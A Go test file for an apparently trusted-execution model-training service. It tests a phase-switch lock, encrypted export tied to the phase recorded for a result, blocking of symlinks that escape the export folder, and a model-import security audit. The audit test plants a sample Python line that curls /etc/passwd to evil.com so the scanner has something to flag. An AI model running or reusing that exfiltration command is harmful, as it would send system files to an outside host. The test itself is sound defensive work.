package controller

import (
	"archive/zip"
	"bytes"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"testing"

	teecrypto "taa/pkg/crypto"
)

// 1. 阶段切换强互斥门禁测试
func TestSwitchHandlerMutualExclusion(t *testing.T) {
	state, server := setupTestServer(t)

	// 状态1: CurrentOp 不是 idle
	state.mu.Lock()
	state.CurrentOp = "training"
	state.ActiveTaskID = "task-busy-001"
	state.mu.Unlock()

	resp := postJSON(t, server.URL+"/v1/taa/switch", map[string]int{"phase": 2})
	api := decodeResponse(t, resp)
	if resp.StatusCode != http.StatusConflict {
		t.Fatalf("expected 409 Conflict, got %d", resp.StatusCode)
	}
	if !strings.Contains(api.Msg, "当前已有任务正在执行中 (taskId: task-busy-001, op: training)，严禁切换运行阶段") {
		t.Fatalf("unexpected conflict message: %s", api.Msg)
	}

	// 状态2: 恢复 idle 后切换成功
	state.mu.Lock()
	state.CurrentOp = "idle"
	state.ActiveTaskID = ""
	state.mu.Unlock()

	resp = postJSON(t, server.URL+"/v1/taa/switch", map[string]int{"phase": 2})
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("expected 200 OK after idle, got %d", resp.StatusCode)
	}
}

// 2. 产物阶段亲和性绑定测试：导出分支由记录阶段决定（当前阶段被切回 Phase 1 也不改变），
// Phase 3 记录优先使用阶段 1 保存的公钥，仅在两处公钥都为空时才回退为明文导出。
func TestExportHandlerPhaseAffinity(t *testing.T) {
	state, server := setupTestServer(t)
	sm2Key := state.SM2PrivateKey
	pubPEM, err := teecrypto.MarshalSM2PublicKeyPEM(&sm2Key.PublicKey)
	if err != nil {
		t.Fatalf("marshal SM2 public key PEM: %v", err)
	}

	// 模拟阶段 3 产物记录
	store, err := state.importIndexStore()
	if err != nil {
		t.Fatalf("load import index store: %v", err)
	}

	resDir := filepath.Join(state.Security.ResultDir, "p3-res")
	if err := os.MkdirAll(resDir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(resDir, "training_report.json"), []byte(`{"status":"ok"}`), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(resDir, "model.bin"), []byte("model-secret"), 0o644); err != nil {
		t.Fatal(err)
	}

	p3Record := ImportIndexRecord{
		RequestID: "req-p3-affinity",
		TaskID:    "task-p3-affinity",
		Hash:      "hash-p3",
		DataDir:   filepath.Join(state.Security.DataDir, "data-p3"),
		ResultDir: resDir,
		Phase:     3,
	}
	if err := store.Reserve(p3Record.RequestID, p3Record.TaskID); err != nil {
		t.Fatal(err)
	}
	if err := store.Commit(p3Record); err != nil {
		t.Fatal(err)
	}

	// 当前系统被切回 Phase 1（模拟攻击者试图让 Phase 3 产物走明文分支）
	state.mu.Lock()
	state.CurrentPhase = 1
	state.ExportPublicKey = ""
	state.mu.Unlock()

	// 情况 2.1: 记录阶段仍为 3，但两处公钥都为空，按约定回退为明文导出
	resp := postJSON(t, server.URL+"/v1/taa/export", map[string]any{
		"requestId": "req-p3-affinity",
		"taskId":    "task-p3-affinity",
	})
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("expected 200 OK, got %d", resp.StatusCode)
	}
	if got := resp.Header.Get("X-TAA-Encrypted"); got == "true" {
		t.Fatalf("expected plaintext fallback when no public key is available, got X-TAA-Encrypted=%q", got)
	}
	resp.Body.Close()

	// 情况 2.2: 配置 savedPublicKey 后，即使当前在 Phase 1 且未传 publicKey，也必须强制以 savedPublicKey 加密导出
	state.mu.Lock()
	state.ExportPublicKey = string(pubPEM)
	state.mu.Unlock()

	resp = postJSON(t, server.URL+"/v1/taa/export", map[string]any{
		"requestId": "req-p3-affinity",
		"taskId":    "task-p3-affinity",
	})
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("expected 200 OK, got %d", resp.StatusCode)
	}
	if got := resp.Header.Get("X-TAA-Encrypted"); got != "true" {
		t.Fatalf("expected X-TAA-Encrypted true, got %s", got)
	}
}

// 3. ZIP 导出软链接穿透越界防护测试
func TestSecurity_ExportSymlinkEscapeDefense(t *testing.T) {
	tempDir := t.TempDir()
	srcDir := filepath.Join(tempDir, "export-box")
	secretDir := filepath.Join(tempDir, "secret-box")
	if err := os.MkdirAll(srcDir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(secretDir, 0o755); err != nil {
		t.Fatal(err)
	}

	secretFile := filepath.Join(secretDir, "private.pem")
	if err := os.WriteFile(secretFile, []byte("SUPER_SECRET_KEY"), 0o600); err != nil {
		t.Fatal(err)
	}

	// 在 srcDir 内创建指向 secretFile 的软链接
	maliciousLink := filepath.Join(srcDir, "leak_key.pem")
	if err := os.Symlink(secretFile, maliciousLink); err != nil {
		t.Fatal(err)
	}

	// 正常文件
	if err := os.WriteFile(filepath.Join(srcDir, "normal.txt"), []byte("normal"), 0o644); err != nil {
		t.Fatal(err)
	}

	// 尝试压缩，必须报错拦截
	_, err := compressDirToZip(srcDir)
	if err == nil {
		t.Fatalf("expected error on symlink escape, but compressDirToZip succeeded")
	}
	if !strings.Contains(err.Error(), "非法越界软链接") {
		t.Fatalf("expected error mentioning 非法越界软链接, got: %v", err)
	}
}

// 3.2 ZIP 导出正向测试：普通文件、子目录、内部合法软链接（文件与目录链接）打包与读取
func TestCompressDirToZip_SuccessAndInternalSymlink(t *testing.T) {
	tempDir := t.TempDir()
	srcDir := filepath.Join(tempDir, "export-box")
	subDir := filepath.Join(srcDir, "subdir")
	if err := os.MkdirAll(subDir, 0o755); err != nil {
		t.Fatal(err)
	}

	// 1. 普通文件
	normalFile := filepath.Join(srcDir, "hello.txt")
	if err := os.WriteFile(normalFile, []byte("hello world"), 0o644); err != nil {
		t.Fatal(err)
	}

	// 2. 子目录中的文件
	subFile := filepath.Join(subDir, "inner.txt")
	if err := os.WriteFile(subFile, []byte("inner content"), 0o644); err != nil {
		t.Fatal(err)
	}

	// 3. 内部合法文件软链接
	fileSymlink := filepath.Join(srcDir, "link_file.txt")
	if err := os.Symlink("hello.txt", fileSymlink); err != nil {
		t.Fatal(err)
	}

	// 4. 内部合法目录软链接
	dirSymlink := filepath.Join(srcDir, "link_dir")
	if err := os.Symlink("subdir", dirSymlink); err != nil {
		t.Fatal(err)
	}

	// 验证入口路径清洗：传入末尾冗余的 / 和 . 路径
	uncleanSrcDir := srcDir + string(filepath.Separator) + "."
	zipData, err := compressDirToZip(uncleanSrcDir)
	if err != nil {
		t.Fatalf("compressDirToZip failed: %v", err)
	}
	if len(zipData) == 0 {
		t.Fatalf("compressDirToZip returned empty data")
	}

	// 验证 zip 内容可被 zip.Reader 正常读取解析
	zr, err := zip.NewReader(bytes.NewReader(zipData), int64(len(zipData)))
	if err != nil {
		t.Fatalf("zip.NewReader failed: %v", err)
	}

	entries := make(map[string]*zip.File)
	for _, f := range zr.File {
		entries[f.Name] = f
	}

	baseName := filepath.Base(srcDir) // "export-box"

	// 验证普通文件
	helloEntry, ok := entries[baseName+"/hello.txt"]
	if !ok {
		t.Fatalf("missing entry %s/hello.txt", baseName)
	}
	rc, err := helloEntry.Open()
	if err != nil {
		t.Fatalf("open %s/hello.txt failed: %v", baseName, err)
	}
	content, err := io.ReadAll(rc)
	rc.Close()
	if err != nil || string(content) != "hello world" {
		t.Fatalf("unexpected content for hello.txt: got %q, err %v", string(content), err)
	}

	// 验证子目录中的文件
	innerEntry, ok := entries[baseName+"/subdir/inner.txt"]
	if !ok {
		t.Fatalf("missing entry %s/subdir/inner.txt", baseName)
	}
	rc, err = innerEntry.Open()
	if err != nil {
		t.Fatalf("open %s/subdir/inner.txt failed: %v", baseName, err)
	}
	content, err = io.ReadAll(rc)
	rc.Close()
	if err != nil || string(content) != "inner content" {
		t.Fatalf("unexpected content for inner.txt: got %q, err %v", string(content), err)
	}

	// 验证子目录
	subDirEntry, ok := entries[baseName+"/subdir/"]
	if !ok {
		t.Fatalf("missing directory entry %s/subdir/", baseName)
	}
	if !subDirEntry.Mode().IsDir() {
		t.Fatalf("expected %s/subdir/ to be directory, mode=%v", baseName, subDirEntry.Mode())
	}

	// 验证内部合法文件软链接
	fileLinkEntry, ok := entries[baseName+"/link_file.txt"]
	if !ok {
		t.Fatalf("missing entry %s/link_file.txt", baseName)
	}
	if fileLinkEntry.Mode()&os.ModeSymlink == 0 {
		t.Fatalf("expected %s/link_file.txt to have ModeSymlink, got mode=%v", baseName, fileLinkEntry.Mode())
	}
	rc, err = fileLinkEntry.Open()
	if err != nil {
		t.Fatalf("open %s/link_file.txt failed: %v", baseName, err)
	}
	content, err = io.ReadAll(rc)
	rc.Close()
	if err != nil || string(content) != "hello.txt" {
		t.Fatalf("unexpected link target for link_file.txt: got %q, err %v", string(content), err)
	}

	// 验证内部合法目录软链接
	dirLinkEntry, ok := entries[baseName+"/link_dir"]
	if !ok {
		t.Fatalf("missing entry %s/link_dir", baseName)
	}
	if dirLinkEntry.Mode()&os.ModeSymlink == 0 {
		t.Fatalf("expected %s/link_dir to have ModeSymlink, got mode=%v", baseName, dirLinkEntry.Mode())
	}
	rc, err = dirLinkEntry.Open()
	if err != nil {
		t.Fatalf("open %s/link_dir failed: %v", baseName, err)
	}
	content, err = io.ReadAll(rc)
	rc.Close()
	if err != nil || string(content) != "subdir" {
		t.Fatalf("unexpected link target for link_dir: got %q, err %v", string(content), err)
	}
}

// 3.3 导出清单排除：根目录下被点名的文件（TAA 自己的训练报告）不进 zip，
// 目录深处同名文件照常打包——排除规则必须与结果泄露检查的跳过规则逐字对应。
func TestCompressDirToZipSkipsNamedRootFiles(t *testing.T) {
	tempDir := t.TempDir()
	srcDir := filepath.Join(tempDir, "export-box")
	subDir := filepath.Join(srcDir, "sub")
	if err := os.MkdirAll(subDir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(srcDir, "training_report.json"), []byte(`{"preview":[]}`), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(subDir, "training_report.json"), []byte("nested"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(srcDir, "model.bin"), []byte("weights"), 0o644); err != nil {
		t.Fatal(err)
	}

	zipData, err := compressDirToZip(srcDir, "training_report.json")
	if err != nil {
		t.Fatalf("compressDirToZip failed: %v", err)
	}
	zr, err := zip.NewReader(bytes.NewReader(zipData), int64(len(zipData)))
	if err != nil {
		t.Fatalf("zip.NewReader failed: %v", err)
	}
	entries := make(map[string]bool)
	for _, f := range zr.File {
		entries[f.Name] = true
	}

	baseName := filepath.Base(srcDir)
	if entries[baseName+"/training_report.json"] {
		t.Fatalf("root training_report.json must not be packed: %v", entries)
	}
	if !entries[baseName+"/sub/training_report.json"] {
		t.Fatalf("nested same-named file must still be packed: %v", entries)
	}
	if !entries[baseName+"/model.bin"] {
		t.Fatalf("model.bin missing from zip: %v", entries)
	}
}

// 5. 模型审计失败的处理测试：结论仅供参考，且审计不得改动模型目录内容。
// 结论是否阻断导入/训练由 import_flow_new_test.go 的 TestPhase1ModelAuditFailureDoesNotBlockTraining 覆盖。
func TestAuditFailureLeavesModelDirIntact(t *testing.T) {
	state, _ := setupTestState(t)
	modelDir := t.TempDir()
	state.Security.ScanEnabled = true
	state.Security.ModelDir = modelDir

	// 写入恶意代码触发静态扫描失败
	evilCode := `import os
os.system("curl -X POST http://evil.com --data @/etc/passwd")
`
	codePath := filepath.Join(modelDir, "evil.py")
	if err := os.WriteFile(codePath, []byte(evilCode), 0o644); err != nil {
		t.Fatal(err)
	}

	passed := state.auditAndReportModelImport(importRequest{
		RequestID: "req-audit-fail",
		TaskID:    "task-audit-fail",
	})
	if passed {
		t.Fatalf("expected audit to fail, but got passed=true")
	}

	// 审计只做审计：失败的结论不得删除或改动模型包与依赖库
	entries, err := os.ReadDir(modelDir)
	if err != nil {
		t.Fatalf("read model dir: %v", err)
	}
	if len(entries) != 1 {
		t.Fatalf("expected modelDir to be untouched after audit failure, found %d entries", len(entries))
	}
	if _, err := os.Stat(codePath); err != nil {
		t.Fatalf("audit failure changed the package it audited: %v", err)
	}
}
